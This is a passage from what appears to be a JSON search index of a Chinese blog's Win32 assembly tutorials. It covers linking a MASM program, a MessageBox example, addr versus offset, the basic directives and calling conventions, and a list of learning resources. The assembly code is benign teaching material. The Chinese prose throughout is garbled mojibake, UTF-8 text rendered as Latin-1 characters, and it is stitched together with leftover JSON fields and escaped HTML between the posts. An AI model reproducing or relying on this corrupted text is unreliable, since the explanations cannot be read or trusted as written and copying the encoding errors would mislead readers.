å½“æ‚¨æˆåŠŸçš„ç¼–è¯‘äº† msgbox.asm åï¼Œç¼–è¯‘å™¨ä¼šäº§ç”Ÿ msgbox.obj ç›®æ ‡æ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶å’Œå¯æ‰§è¡Œæ–‡ä»¶åªä¸€æ­¥ä¹‹é¥ï¼Œç›®æ ‡æ–‡ä»¶ä¸­åŒ…å«äº†ä»¥äºŒè¿›åˆ¶å½¢å¼å­˜åœ¨çš„æŒ‡ä»¤å’Œæ•°æ®ï¼Œæ¯”å¯æ‰§è¡Œæ–‡ä»¶ç›¸å·®çš„åªæ˜¯é“¾æ¥å™¨åŠ å…¥çš„é‡å®šä½ä¿¡æ¯ã€‚ å¥½ï¼Œæˆ‘ä»¬æ¥é“¾æ¥ç›®æ ‡æ–‡ä»¶ï¼š\n1 link /SUBSYSTEMï¼šWINDOWS /LIBPATHï¼šcï¼š\\masm32\\lib msgbox.obj /SUBSYSTEMï¼šWINDOWS å‘Šè¯‰é“¾æ¥å™¨å¯æ‰§è¡Œæ–‡ä»¶çš„è¿è¡Œå¹³å° /LIBPATHï¼šã€ˆpath to import libraryã€‰ å‘Šè¯‰é“¾æ¥å™¨å¼•å…¥åº“çš„è·¯å¾„ã€‚ é“¾æ¥å™¨åšçš„å·¥ä½œå°±æ˜¯æ ¹æ®å¼•å…¥åº“å¾€ç›®æ ‡æ–‡ä»¶ä¸­åŠ å…¥é‡å®šä½ä¿¡æ¯ï¼Œæœ€åäº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ã€‚ æ—¢ç„¶å¾—åˆ°äº†å¯æ‰§è¡Œæ–‡ä»¶ï¼Œæˆ‘ä»¬æ¥è¿è¡Œä¸€ä¸‹ã€‚å¥½ï¼Œä¸€ã€äºŒã€ä¸‰ï¼ŒGOï¼å±å¹•ä¸Šä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚å“¦ï¼Œå¯¹äº†ï¼Œæˆ‘ä»¬é™¤äº†è°ƒç”¨äº† ExitProcess å‡½æ•°å¤–ï¼Œä»€ä¹ˆéƒ½è¿˜æ²¡åšå‘¢ï¼ä½†æ˜¯åˆ«ä¸€ç‚¹æˆå°±æ„Ÿéƒ½æ²¡æœ‰å“¦ï¼Œå› ä¸ºæˆ‘ä»¬ç”¨æ±‡ç¼–æ‰€å†™çš„æ˜¯ä¸€ä¸ªçœŸæ­£ Windows ç¨‹åºï¼Œä¸ä¿¡çš„è¯ï¼Œçœ‹çœ‹æ‚¨ç£ç›˜ä¸Šçš„ msgbox.exeæ–‡ä»¶ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥åšä¸€ç‚¹å¯ä»¥çœ‹çš„è§æ‘¸çš„ç€çš„ï¼Œæˆ‘ä»¬åœ¨ç¨‹åºä¸­åŠ å…¥ä¸€ä¸ªå¯¹è¯æ¡†ã€‚è¯¥å‡½æ•°çš„åŸå‹å¦‚ä¸‹ï¼š\n1 MessageBox PROTO hwndï¼šDWORDï¼Œ lpTextï¼šDWORDï¼Œ lpCaptionï¼šDWORDï¼Œ uTypeï¼šDWORD hWnd æ˜¯çˆ¶çª—å£çš„å¥æŸ„ã€‚å¥æŸ„ä»£è¡¨æ‚¨å¼•ç”¨çš„çª—å£çš„ä¸€ä¸ªåœ°å€æŒ‡é’ˆã€‚å®ƒçš„å€¼å¯¹æ‚¨ç¼– Windows ç¨‹åºå¹¶ä¸é‡è¦ï¼ˆè¯‘è€…æ³¨ï¼šå¦‚æœæ‚¨æƒ³æˆä¸ºé«˜æ‰‹åˆ™æ˜¯å¿…é¡»çš„ï¼‰ï¼Œæ‚¨åªè¦çŸ¥é“å®ƒä»£è¡¨ä¸€ä¸ªçª—å£ã€‚å½“æ‚¨è¦å¯¹çª—å£åšä»»ä½•æ“ä½œæ—¶ï¼Œå¿…é¡»è¦å¼•ç”¨è¯¥çª—å£çš„æŒ‡é’ˆã€‚ lpText æ˜¯æŒ‡å‘æ‚¨è¦æ˜¾ç¤ºçš„æ–‡æœ¬çš„æŒ‡é’ˆã€‚æŒ‡å‘æ–‡æœ¬ä¸²çš„æŒ‡é’ˆäº‹å®ä¸Šå°±æ˜¯æ–‡æœ¬ä¸²çš„é¦–åœ°å€ã€‚ lpCaption æ˜¯æŒ‡å‘æ‚¨è¦æ˜¾ç¤ºçš„å¯¹è¯æ¡†çš„æ ‡é¢˜æ–‡æœ¬ä¸²æŒ‡é’ˆã€‚ uType æ˜¯æ˜¾ç¤ºåœ¨å¯¹è¯æ¡†çª—å£ä¸Šçš„å°å›¾æ ‡çš„ç±»å‹ã€‚ ä¸‹é¢æ˜¯æºç¨‹åº\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .386 .model flat,stdcall option casemap:none include \\masm32\\include\\windows.inc include \\masm32\\include\\kernel32.inc includelib \\masm32\\lib\\kernel32.lib include \\masm32\\include\\user32.inc includelib \\masm32\\lib\\user32.lib .data MsgBoxCaption db \u0026#34;å¯çˆ±çš„æ ‡é¢˜\u0026#34;ï¼Œ0 MsgBoxText db \u0026#34;ä½ å¥½ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªWin32æ±‡ç¼–ç¨‹åº\u0026#34;ï¼Œ0 .code start: invoke MessageBox, NULL, addr MsgBoxText, addr MsgBoxCaption, MB_OK invoke ExitProcess, NULL end start ç¼–è¯‘ã€é“¾æ¥ä¸Šé¢çš„ç¨‹åºæ®µï¼Œå¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ã€‚è¿è¡Œï¼Œå“ˆå“ˆï¼Œçª—å£ä¸Šå¼¹å‡ºäº†ä¸€ä¸ªå¯¹è¯æ¡†ï¼Œä¸Šé¢æœ‰ä¸€è¡Œå­—ï¼šâ€œä½ å¥½ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªWin32æ±‡ç¼–ç¨‹åºâ€ã€‚\nå¥½ï¼Œæˆ‘ä»¬å›è¿‡å¤´æ¥çœ‹çœ‹ä¸Šé¢çš„æºä»£ç ã€‚æˆ‘ä»¬åœ¨.DATAâ€œåˆ†æ®µâ€å®šä¹‰äº†ä¸¤ä¸ªNULLç»“å°¾çš„å­—ç¬¦ä¸²ã€‚æˆ‘ä»¬ç”¨äº†ä¸¤ä¸ªå¸¸é‡ï¼šNULL å’Œ MB_OKã€‚è¿™äº›å¸¸é‡åœ¨windows.inc æ–‡ä»¶ä¸­æœ‰å®šä¹‰ï¼Œä½¿ç”¨å¸¸é‡ä½¿å¾—æ‚¨çš„ç¨‹åºæœ‰è¾ƒå¥½çš„å¯è¯»æ€§ã€‚ addr æ“ä½œç¬¦ç”¨æ¥æŠŠæ ‡å·çš„åœ°å€ä¼ é€’ç»™è¢«è°ƒç”¨çš„å‡½æ•°ï¼Œå®ƒåªèƒ½ç”¨åœ¨ invoke è¯­å¥ä¸­ï¼Œè­¬å¦‚æ‚¨ä¸èƒ½ç”¨å®ƒæ¥æŠŠæ ‡å·çš„åœ°å€èµ‹ç»™å¯„å­˜å™¨æˆ–å˜é‡ï¼Œå¦‚æœæƒ³è¿™æ ·åšåˆ™è¦ç”¨ offset æ“ä½œç¬¦ã€‚åœ¨ offset å’Œ addr ä¹‹é—´æœ‰å¦‚ä¸‹åŒºåˆ«ï¼š\naddrä¸å¯ä»¥å¤„ç†å‘å‰å¼•ç”¨ï¼Œoffsetåˆ™èƒ½ã€‚æ‰€è°“å‘å‰å¼•ç”¨æ˜¯æŒ‡ï¼šæ ‡å·çš„å®šä¹‰æ˜¯åœ¨invoke è¯­å¥ä¹‹åï¼Œè­¬å¦‚åœ¨å¦‚ä¸‹çš„ä¾‹å­ï¼š\n1 2 3 4 5 6 invoke MessageBoxï¼ŒNULLï¼Œ addr MsgBoxTextï¼Œaddr MsgBoxCaptionï¼ŒMB_OK ...... MsgBoxCaption db \u0026#34;å¯çˆ±çš„æ ‡é¢˜\u0026#34;ï¼Œ0 MsgBoxText db \u0026#34;ä½ å¥½ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªWin32æ±‡ç¼–ç¨‹åº\u0026#34;ï¼Œ0 å¦‚æœæ‚¨æ˜¯ç”¨ addr è€Œä¸æ˜¯ offset çš„è¯ï¼Œé‚£ MASM å°±ä¼šæŠ¥é”™ã€‚\naddrå¯ä»¥å¤„ç†å±€éƒ¨å˜é‡è€Œ offset åˆ™ä¸èƒ½ã€‚å±€éƒ¨å˜é‡åªæ˜¯åœ¨è¿è¡Œæ—¶åœ¨å †æ ˆä¸­åˆ†é…å†…å­˜ç©ºé—´ã€‚è€Œ offset åˆ™æ˜¯åœ¨ç¼–è¯‘æ—¶ç”±ç¼–è¯‘å™¨è§£é‡Šï¼Œè¿™æ˜¾ç„¶ä¸èƒ½ç”¨ offset åœ¨è¿è¡Œæ—¶æ¥åˆ†é…å†…å­˜ç©ºé—´ã€‚ç¼–è¯‘å™¨å¯¹ addr çš„å¤„ç†æ˜¯å…ˆæ£€æŸ¥å¤„ç†çš„æ˜¯å…¨å±€è¿˜æ˜¯å±€éƒ¨å˜é‡ï¼Œè‹¥æ˜¯å…¨å±€å˜é‡åˆ™æŠŠå…¶åœ°å€æ”¾åˆ°ç›®æ ‡æ–‡ä»¶ä¸­ï¼Œè¿™ä¸€ç‚¹å’Œ offset ç›¸åŒï¼Œè‹¥æ˜¯å±€éƒ¨å˜é‡ï¼Œå°±åœ¨æ‰§è¡Œ invoke è¯­å¥å‰äº§ç”Ÿå¦‚ä¸‹æŒ‡ä»¤åºåˆ—ï¼š\n1 2 lea eaxï¼Œ LocalVar push eax å› ä¸ºleaæŒ‡ä»¤èƒ½å¤Ÿåœ¨è¿è¡Œæ—¶å†³å®šæ ‡å·çš„æœ‰æ•ˆåœ°å€ï¼Œæ‰€ä»¥æœ‰äº†ä¸Šè¿°æŒ‡ä»¤åºåˆ—ï¼Œå°±å¯ä»¥ä¿è¯ invoke çš„æ­£ç¡®æ‰§è¡Œäº†ã€‚\næ›´æ–¹ä¾¿çš„ç¼–è¯‘é€‰æ‹©ï¼šVisual MASM æ–°å»ºä¸€ä¸ªasmåç¼€æ–‡ä»¶ï¼Œç”¨Visual MASMæ‰“å¼€ï¼ŒæŠŠä¸Šé¢çš„ä»£ç å¤åˆ¶è¿›å»ï¼Œç‚¹å‡»å·¦ä¸Šè§’çš„Runå³å¯ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚ ","permalink":"https://www.hacktech.cn/post/win32-%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-2-%E6%B6%88%E6%81%AF%E6%A1%86.html","summary":"\u003cp\u003eè¿™ä¸€æ¬¡ï¼Œæˆ‘ä»¬å°†ç”¨æ±‡ç¼–è¯­è¨€å†™ä¸€ä¸ª Windows ç¨‹åºï¼Œç¨‹åºè¿è¡Œæ—¶å°†å¼¹å‡ºä¸€ä¸ªæ¶ˆæ¯æ¡†å¹¶æ˜¾ç¤º\u0026quot;ä½ å¥½ï¼Œæˆ‘çš„ç¬¬ä¸€ä¸ªWin32æ±‡ç¼–ç¨‹åº\u0026quot;ã€‚\u003c/p\u003e","title":"win32 æ±‡ç¼–å­¦ä¹ (2)ï¼šæ¶ˆæ¯æ¡†"},{"content":"èƒŒæ™¯çŸ¥è¯† Windows æŠŠæ¯ä¸€ä¸ª Win32 åº”ç”¨ç¨‹åºæ”¾åˆ°åˆ†å¼€çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­å»è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªåº”ç”¨ç¨‹åºéƒ½æ‹¥æœ‰å…¶ç›¸äº’ç‹¬ç«‹çš„ 4GB åœ°å€ç©ºé—´ï¼Œå½“ç„¶è¿™å€’ä¸æ˜¯è¯´å®ƒä»¬éƒ½æ‹¥æœ‰ 4GB çš„ç‰©ç†åœ°å€ç©ºé—´ï¼Œè€Œåªæ˜¯è¯´èƒ½å¤Ÿåœ¨ 4GB çš„èŒƒå›´å†…å¯»å€ã€‚æ“ä½œç³»ç»Ÿå°†ä¼šåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶å®Œæˆ 4GB çš„è™šæ‹Ÿåœ°å€å’Œç‰©ç†å†…å­˜åœ°å€é—´çš„è½¬æ¢ã€‚è¿™å°±è¦æ±‚ç¼–å†™åº”ç”¨ç¨‹åºæ—¶å¿…é¡»æ ¼å®ˆ Windows çš„è§„èŒƒï¼Œå¦åˆ™ææ˜“å¼•èµ·å†…å­˜çš„ä¿æŠ¤æ¨¡å¼é”™è¯¯ã€‚è€Œè¿‡å»çš„ Win16 å†…å­˜æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½è¿è¡ŒäºåŒä¸€ä¸ª 4GB åœ°å€ç©ºé—´ï¼Œå®ƒä»¬å¯ä»¥å½¼æ­¤\u0026quot;çœ‹\u0026quot;åˆ°åˆ«çš„ç¨‹åºçš„å†…å®¹ï¼Œè¿™ææ˜“å¯¼è‡´ä¸€ä¸ªåº”ç”¨ç¨‹åºç ´åå¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”šè‡³æ˜¯æ“ä½œç³»ç»Ÿçš„æ•°æ®æˆ–ä»£ç ã€‚\nå’Œ 16 ä½ Windows ä¸‹çš„æŠŠä»£ç åˆ†æˆ DATAï¼ŒCODE ç­‰æ®µçš„å†…å­˜æ¨¡å¼ä¸åŒï¼ŒWIN32 åªæœ‰ä¸€ç§å†…å­˜æ¨¡å¼ï¼Œå³ FLAT æ¨¡å¼ï¼Œæ„æ€æ˜¯\u0026quot;å¹³å¦\u0026quot;çš„å†…å­˜æ¨¡å¼ï¼Œå†æ²¡æœ‰ 64K çš„æ®µå¤§å°é™åˆ¶ï¼Œæ‰€æœ‰çš„ WIN32 çš„åº”ç”¨ç¨‹åºè¿è¡Œåœ¨ä¸€ä¸ªè¿ç»­ã€å¹³å¦ã€å·¨å¤§çš„ 4GB çš„ç©ºé—´ä¸­ã€‚è¿™åŒæ—¶ä¹Ÿæ„å‘³ç€æ‚¨æ— é¡»å’Œæ®µå¯„å­˜å™¨æ‰“äº¤é“ï¼Œæ‚¨å¯ä»¥ç”¨ä»»æ„çš„æ®µå¯„å­˜å™¨å¯»å€ä»»æ„çš„åœ°å€ç©ºé—´ï¼Œè¿™å¯¹äºç¨‹åºå‘˜æ¥è¯´æ˜¯éå¸¸æ–¹ä¾¿çš„ï¼Œè¿™ä¹Ÿä½¿å¾—ç”¨32ä½æ±‡ç¼–è¯­è¨€å’Œç”¨Cè¯­è¨€ä¸€æ ·æ–¹ä¾¿ã€‚ åœ¨Win32ä¸‹ç¼–ç¨‹ï¼Œæœ‰è®¸å¤šé‡è¦çš„è§„åˆ™éœ€è¦éµå®ˆã€‚æœ‰ä¸€æ¡å¾ˆé‡è¦çš„æ˜¯ï¼šWindows åœ¨å†…éƒ¨é¢‘ç¹ä½¿ç”¨ ESIï¼ŒEDIï¼ŒEBPï¼ŒEBX å¯„å­˜å™¨ï¼Œè€Œä¸”å¹¶ä¸å»æ£€æµ‹è¿™äº›å¯„å­˜å™¨çš„å€¼æ˜¯å¦è¢«æ›´æ”¹ï¼Œè¿™æ ·å½“æ‚¨è¦ä½¿ç”¨è¿™äº›å¯„å­˜å™¨æ—¶å¿…é¡»å…ˆä¿å­˜å®ƒä»¬çš„å€¼ï¼Œå¾…ç”¨å®Œåå†æ¢å¤å®ƒä»¬ï¼Œä¸€ä¸ªæœ€æ˜¾è‘—çš„åº”ç”¨ä¾‹å­å°±æ˜¯ Windows çš„ CallBack å‡½æ•°ä¸­ã€‚\nå†…å®¹ ä¸€èˆ¬çš„Win32æ±‡ç¼–éƒ½æœ‰ä¸‹é¢çš„ç¨‹åºæ®µï¼Œè¿™æ˜¯ä¸€ä¸ªWin32æ±‡ç¼–ç¼–ç¨‹çš„åŸºç¡€æ¡†æ¶ï¼Œè‹¥æ‚¨ç°åœ¨è¿˜ä¸çŸ¥é“è¿™äº›æŒ‡ä»¤çš„ç¡®åˆ‡æ„ä¹‰çš„è¯ï¼Œæ²¡å…³ç³»ï¼Œ éšåæˆ‘å°±ä¼šç»™å¤§å®¶è¯¦ç»†è§£é‡Šã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 .386 .MODEL Flat, STDCALL .DATA \u0026lt;Your initialized data\u0026gt; ...... .DATA? \u0026lt;Your uninitialized data\u0026gt; ...... .CONST \u0026lt;Your constants\u0026gt; ...... .CODE \u0026lt;label\u0026gt; \u0026lt;Your code\u0026gt; ..... end \u0026lt;label\u0026gt; è¿™å°±æ˜¯ä¸€èˆ¬Win32æ±‡ç¼–ç¼–ç¨‹çš„åŸºç¡€æ¡†æ¶ï¼Œå…¶ä¸­å„ä¸ªå…³é”®è¯çš„è§£é‡Šè¯´æ˜å¦‚ä¸‹ï¼š\n1 .386 è¿™æ˜¯ä¸€ä¸ªæ±‡ç¼–è¯­è¨€ä¼ªæŒ‡ä»¤ï¼Œä»–å‘Šè¯‰ç¼–è¯‘å™¨æˆ‘ä»¬çš„ç¨‹åºæ˜¯ä½¿ç”¨80386æŒ‡ä»¤é›†ç¼–å†™çš„ã€‚æ‚¨è¿˜å¯ä»¥ä½¿ç”¨ .486ã€.586ï¼Œ ä½†æœ€å®‰å…¨çš„è¿˜æ˜¯ä½¿ç”¨.386ã€‚å¯¹äºæ¯ä¸€ç§CPUæœ‰ä¸¤å¥—å‡ ä¹åŠŸèƒ½ç›¸åŒä¼ªæŒ‡ä»¤ï¼š .386/.386Pã€ 486/.486Pã€ 586/.586Pã€‚ å¸¦Pçš„æŒ‡ä»¤æ ‡æ˜æ‚¨çš„ç¨‹åºä¸­å¯ä»¥ç”¨ç‰¹æƒçº§æŒ‡ä»¤ã€‚ç‰¹æƒçº§æŒ‡ä»¤æ˜¯ä¿ç•™ç»™æ“ä½œç³»ç»Ÿçš„ï¼Œå¦‚è™šæ‹Ÿè®¾å¤‡é©±åŠ¨ç¨‹åºã€‚åœ¨å¤§å¤šæ•°æ—¶é—´ï¼Œæ‚¨çš„ç¨‹åºéƒ½æ— é¡»è¿è¡Œåœ¨RING0å±‚ï¼Œæ•…ç”¨ä¸å¸¦åç¼€Pçš„ä¼ªæŒ‡ä»¤å·²è¶³å¤Ÿäº†ã€‚\n1 .MODEL FLATï¼ŒSTDCALL .MODEL æ˜¯ç”¨æ¥æŒ‡å®šå†…å­˜æ¨¡å¼çš„ä¼ªæŒ‡ä»¤ï¼Œåœ¨Win32ä¸‹ï¼Œåªæœ‰ä¸€ç§å†…å­˜æ¨¡å‹ï¼Œé‚£å°±æ˜¯FLATã€‚ STDCALL å‘Šè¯‰ç¼–è¯‘å™¨å‚æ•°çš„ä¼ é€’çº¦å®šã€‚å‚æ•°çš„ä¼ é€’çº¦å®šæ˜¯æŒ‡å‚æ•°ä¼ è¾¾æ—¶çš„é¡ºåº(ä»å·¦åˆ°å³æˆ–ä»å³åˆ°å·¦)å’Œç”±è°æ¢å¤å †æ ˆæŒ‡é’ˆ(è°ƒç”¨è€…æˆ–è¢«è°ƒç”¨è€…)ã€‚åœ¨Win16ä¸‹æœ‰ä¸¤ç§çº¦å®šï¼šC å’Œ PASCALã€‚C çº¦å®šè§„å®šå‚æ•°ä¼ é€’é¡ºåºæ˜¯ä»å³åˆ°å·¦ï¼Œå³æœ€å³è¾¹çš„å‚æ•°æœ€å…ˆå‹æ ˆï¼Œç”±è°ƒç”¨è€…æ¢å¤å †æ ˆæŒ‡é’ˆã€‚\nä¾‹å¦‚ï¼šä¸ºè°ƒç”¨å‡½æ•° foo ( int first_paramï¼Œ int second_paramï¼Œ int third_param )ï¼› æŒ‰Cçº¦å®šçš„æ±‡ç¼–ä»£ç åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š\n1 2 3 4 5 push [third_param] push [second_param] push [first_param] call foo add espï¼Œ 3 * 4 ;è°ƒç”¨è€…è‡ªå·±æ¢å¤å †æ ˆæŒ‡é’ˆ PASCALçº¦å®šå’ŒCçº¦å®šæ­£å¥½ç›¸åï¼Œå®ƒè§„å®šå‚æ•°æ˜¯ä»å·¦å‘å³ä¼ é€’ï¼Œç”±è¢«è°ƒç”¨è€…æ¢å¤å †æ ˆã€‚Win16é‡‡ç”¨äº†PASCALçº¦å®šï¼Œ å› ä¸ºPASCALçº¦å®šäº§ç”Ÿçš„ä»£ç é‡è¦å°ã€‚å½“ä¸çŸ¥é“å‚æ•°çš„ä¸ªæ•°æ—¶ï¼ŒCçº¦å®šç‰¹åˆ«æœ‰ç”¨ã€‚å¦‚åœ¨å‡½æ•°wsprintf () ä¸­ï¼Œ wsprintfé¢„å…ˆå¹¶ä¸çŸ¥é“è¦ä¼ é€’å‡ ä¸ªå‚æ•°ï¼Œæ‰€ä»¥å®ƒä¸çŸ¥é“å¦‚ä½•æ¢å¤å †æ ˆã€‚STDCALLæ˜¯Cçº¦å®šå’ŒPASCALçº¦å®šçš„æ··åˆä½“ï¼Œå®ƒè§„å®šå‚æ•°çš„ä¼ é€’æ˜¯ä»å³åˆ°å·¦ï¼Œæ¢å¤å †æ ˆçš„å·¥ä½œäº¤ç”±è¢«è°ƒç”¨è€…ã€‚Win32åªç”¨STDCALLçº¦å®šï¼Œä½†é™¤äº†ä¸€ä¸ªç‰¹ä¾‹ï¼Œå³ï¼šwsprintfã€‚\n1 2 3 4 .DATA .DATA? .CONST .CODE ä¸Šé¢çš„å››ä¸ªä¼ªæŒ‡ä»¤æ˜¯\u0026quot;åˆ†æ®µ\u0026quot;(SECTION)ä¼ªæŒ‡ä»¤ã€‚æˆ‘ä»¬ä¸Šé¢åˆšè®²è¿‡Win32ä¸‹æ²¡æœ‰\u0026quot;æ®µ\u0026quot;(SEGMENT)çš„æ¦‚å¿µï¼Œä½†æ˜¯æ‚¨å¯ä»¥æŠŠæ‚¨çš„ç¨‹åºåˆ†æˆä¸åŒçš„\u0026quot;åˆ†æ®µ\u0026quot;ï¼Œ ä¸€ä¸ª\u0026quot;åˆ†æ®µ\u0026quot;çš„å¼€å§‹å³æ˜¯ä¸Šä¸€ä¸ª\u0026quot;åˆ†æ®µ\u0026quot;çš„ç»“æŸã€‚WIN32ä¸­åªæœ‰ä¸¤ç§æ€§è´¨çš„\u0026quot;åˆ†æ®µ\u0026quot;ï¼šDATAå’ŒCODEã€‚\nå…¶ä¸­DATA\u0026quot;åˆ†æ®µ\u0026quot;åˆåˆ†ä¸ºä¸‰ç§ï¼š\n.DATA å…¶ä¸­åŒ…æ‹¬å·²åˆå§‹åŒ–çš„æ•°æ®ã€‚ .DATA? å…¶ä¸­åŒ…æ‹¬æœªåˆå§‹åŒ–çš„æ•°æ®ã€‚æ¯”å¦‚æœ‰æ—¶æ‚¨ä»…æƒ³é¢„å…ˆåˆ†é…ä¸€äº›å†…å­˜ä½†å¹¶ä¸æƒ³æŒ‡å®šåˆå§‹å€¼ã€‚ä½¿ç”¨æœªåˆå§‹åŒ–çš„æ•°æ®çš„ä¼˜ç‚¹æ˜¯å®ƒä¸å æ®å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œå¦‚ï¼šè‹¥æ‚¨è¦åœ¨ .DATA? æ®µä¸­åˆ†é…10,000å­—èŠ‚çš„ç©ºé—´ï¼Œæ‚¨çš„å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°æ— é¡»å¢åŠ 10,000å­—èŠ‚ï¼Œè€Œä»…ä»…æ˜¯è¦å‘Šè¯‰ç¼–è¯‘å™¨åœ¨è£…è½½å¯æ‰§è¡Œæ–‡ä»¶æ—¶åˆ†é…æ‰€éœ€å­—èŠ‚ã€‚ .CONST å…¶ä¸­åŒ…æ‹¬å¸¸é‡å®šä¹‰ã€‚è¿™äº›å¸¸é‡åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­æ˜¯ä¸èƒ½æ›´æ”¹çš„ã€‚ åº”ç”¨ç¨‹åºå¹¶ä¸éœ€è¦ä»¥ä¸Šæ‰€æœ‰çš„ä¸‰ä¸ª\u0026quot;åˆ†æ®µ\u0026quot;ï¼Œ å¯ä»¥æ ¹æ®éœ€è¦è¿›è¡Œå®šä¹‰ã€‚ .CODE è¿™æ˜¯ä»£ç \u0026quot;åˆ†æ®µ\u0026quot;ã€‚ å®é™…ä¸Šï¼Œåˆ†æ®µå¹¶ä¸æ˜¯è±¡åœ¨ Dos ä¸‹ä¸€æ ·ï¼Œä¸ºä¸åŒçš„æ®µåˆ†åˆ«æŒ‡å‡ºä¸åŒçš„æ®µå¯„å­˜å™¨ï¼Œå› ä¸º Windows ä¸‹åªæœ‰ä¸€ä¸ª 4GB çš„æ®µï¼ŒWindows ç¨‹åºä¸­çš„åˆ†æ®µè¡¨ç°åœ¨å½“ç¨‹åºè£…è½½æ—¶ï¼Œèµ‹äºˆä¸åŒçš„åˆ†æ®µä¸åŒçš„å±æ€§ï¼Œæ¯”å¦‚è¯´å½“ä½ çš„ç¨‹åºåŠ è½½æ—¶ï¼Œå¯¹äº Ring3 ç¨‹åºæ¥è¯´ï¼Œ.code æ®µæ˜¯ä¸å¯å†™çš„ï¼Œè€Œ .data æ®µæ˜¯å¯å†™çš„ï¼Œå¦‚æœä½ å°è¯•è±¡åœ¨ Dos ä¸‹ä¸€æ ·å†™è‡ªå·±çš„ä»£ç éƒ¨åˆ†ï¼Œä½ ä¼šå¾—åˆ°ä¸€ä¸ªè“å±é”™è¯¯\n1 2 \u0026lt;label\u0026gt; end \u0026lt;label\u0026gt; æ˜¯ç”¨æ¥å”¯ä¸€æ ‡è¯†æ‚¨çš„ä»£ç èŒƒå›´çš„æ ‡ç­¾ï¼Œ ä¸¤ä¸ªæ ‡ç­¾å¿…é¡»ç›¸åŒï¼Œåº”ç”¨ç¨‹åºçš„æ‰€æœ‰å¯æ‰§è¡Œä»£ç å¿…é¡»åœ¨ä¸¤ä¸ªæ ‡ç­¾ä¹‹é—´ã€‚\n","permalink":"https://www.hacktech.cn/post/win32%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0-1-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.html","summary":"\u003ch2 id=\"èƒŒæ™¯çŸ¥è¯†\"\u003eèƒŒæ™¯çŸ¥è¯†\u003c/h2\u003e\n\u003cp\u003eWindows æŠŠæ¯ä¸€ä¸ª Win32 åº”ç”¨ç¨‹åºæ”¾åˆ°åˆ†å¼€çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­å»è¿è¡Œï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªåº”ç”¨ç¨‹åºéƒ½æ‹¥æœ‰å…¶ç›¸äº’ç‹¬ç«‹çš„ 4GB åœ°å€ç©ºé—´ï¼Œå½“ç„¶è¿™å€’ä¸æ˜¯è¯´å®ƒä»¬éƒ½æ‹¥æœ‰ 4GB çš„ç‰©ç†åœ°å€ç©ºé—´ï¼Œè€Œåªæ˜¯è¯´èƒ½å¤Ÿåœ¨ 4GB çš„èŒƒå›´å†…å¯»å€ã€‚æ“ä½œç³»ç»Ÿå°†ä¼šåœ¨åº”ç”¨ç¨‹åºè¿è¡Œæ—¶å®Œæˆ 4GB çš„è™šæ‹Ÿåœ°å€å’Œç‰©ç†å†…å­˜åœ°å€é—´çš„è½¬æ¢ã€‚è¿™å°±è¦æ±‚ç¼–å†™åº”ç”¨ç¨‹åºæ—¶å¿…é¡»æ ¼å®ˆ Windows çš„è§„èŒƒï¼Œå¦åˆ™ææ˜“å¼•èµ·å†…å­˜çš„ä¿æŠ¤æ¨¡å¼é”™è¯¯ã€‚è€Œè¿‡å»çš„ Win16 å†…å­˜æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰çš„åº”ç”¨ç¨‹åºéƒ½è¿è¡ŒäºåŒä¸€ä¸ª 4GB åœ°å€ç©ºé—´ï¼Œå®ƒä»¬å¯ä»¥å½¼æ­¤\u0026quot;çœ‹\u0026quot;åˆ°åˆ«çš„ç¨‹åºçš„å†…å®¹ï¼Œè¿™ææ˜“å¯¼è‡´ä¸€ä¸ªåº”ç”¨ç¨‹åºç ´åå¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”šè‡³æ˜¯æ“ä½œç³»ç»Ÿçš„æ•°æ®æˆ–ä»£ç ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (1)ï¼šåŸºæœ¬æ¦‚å¿µ"},{"content":"ä¸€äº›win32æ±‡ç¼–ä¸‹å­¦ä¹ èµ„æºä¸å·¥å…·æ”¶é›†\nç½‘ç«™ AoGoæ±‡ç¼–å°ç«™(MASMPlusä½œè€…)\nWin32Asmæ•™ç¨‹åœ¨çº¿ç‰ˆ\nWin32Asmæ•™ç¨‹åšå®¢å›­æ–‡ä»¶å¤‡ä»½ç‰ˆ Masm32è¡¥å……æ•™ç¨‹ç³»åˆ— Win32 ASM Tutorial Resource Kitï¼šdREAMtHEATERæ”¶é›†çš„WIN32ASMæ•™ç¨‹ï¼Œå†…å®¹å¾ˆå…¨ï¼ŒåŒ…æ‹¬32ä½æ±‡ç¼–çš„åŸºç¡€çŸ¥è¯†ï¼ŒIczelionçš„ç»å…¸æ•™ç¨‹ä¸­è‹±æ–‡ç‰ˆï¼Œç½—äº‘å½¬çš„32ä½æ±‡ç¼–æ•™ç¨‹ï¼Œè¿˜æœ‰PEæ ¼å¼å’ŒVxDçš„ä¸€äº›å†…å®¹ã€‚ IDE MASMPlus Visual MASM(æ¨è) RadASM2_fork RadAsm 3.xæ”¯æŒä¸­æ–‡æ³¨é‡Š SASM Easy Code 